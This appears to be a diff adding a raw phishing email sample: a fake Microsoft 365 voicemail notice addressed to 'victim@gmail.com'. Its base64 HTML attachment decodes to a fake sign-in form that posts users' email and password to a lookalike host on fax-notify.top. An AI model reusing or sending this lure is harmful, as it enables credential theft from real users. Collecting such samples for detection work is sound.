@@ -1,0 +1,34 @@
+Delivered-To: victim@gmail.com
+Received: by 2002:a05:612c:2c92:b0:605:d55e:8f60 with SMTP id iu18csp12415996vqb; Mon, 21 Sep 2026 08:49:05 -0700 (PDT)
+X-Received: by 2002:a05:6214:1c8e:b0:6a1:8f44 with SMTP id xyz; Mon, 21 Sep 2026 08:49:05 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1790005745; cv=none; d=google.com; s=arc-20240605; b=abc
+ARC-Authentication-Results: i=1; mx.google.com; spf=pass (google.com: domain of noreply@fax-notify.top designates 185.222.58.9 as permitted sender) smtp.mailfrom=noreply@fax-notify.top; dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=fax-notify.top
+Return-Path: <bounce@fax-notify.top>
+Received: from mail.fax-notify.top (mail.fax-notify.top. [185.222.58.9]) by mx.google.com with ESMTPS id 6a1803df08f44-91260be7b36si82348806d6.70.2026.09.21.08.49.05 for <victim@gmail.com> (version=TLS1_2 cipher=ECDHE-ECDSA-CHACHA20-POLY1305 bits=256/256); Mon, 21 Sep 2026 08:49:05 -0700 (PDT)
+Received-SPF: pass (google.com: domain designates 185.222.58.9 as permitted sender) client-ip=185.222.58.9;
+Authentication-Results: mx.google.com; spf=pass (google.com: domain of noreply@fax-notify.top designates 185.222.58.9 as permitted sender) smtp.mailfrom=noreply@fax-notify.top; dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=fax-notify.top
+From: Microsoft 365 Voicemail <noreply@fax-notify.top>
+To: victim@gmail.com
+Subject: You have a new voicemail (00:47) - Listen now
+Date: Mon, 21 Sep 2026 15:48:59 +0000
+Message-ID: <vm-88213@fax-notify.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_MS_mix_000002"
+
+------=_MS_mix_000002
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHk+PHA+WW91IHJlY2VpdmVkIGEgbmV3IHZvaWNlIG1lc3NhZ2UuIE9wZW4gdGhl
+IGF0dGFjaGVkIGZpbGUgdG8gbGlzdGVuLjwvcD48L2JvZHk+PC9odG1sPg==
+------=_MS_mix_000002
+Content-Type: text/html; name="VM_Playback_00-47.html"
+Content-Disposition: attachment; filename="VM_Playback_00-47.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGhlYWQ+PHNjcmlwdD52YXIgcD1hdG9iKCJQR1p2Y20wKyIpO2RvY3VtZW50LndyaXRl
+KHApOzwvc2NyaXB0PjwvaGVhZD48Ym9keT48Zm9ybSBhY3Rpb249Imh0dHBzOi8vbG9naW4tbTM2
+NS5mYXgtbm90aWZ5LnRvcC9vd2EucGhwIj48aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9InUiPjxp
+bnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+PGJ1dHRvbj5TaWduIGluPC9idXR0b24+PC9m
+b3JtPjwvYm9keT48L2h0bWw+
+------=_MS_mix_000002--
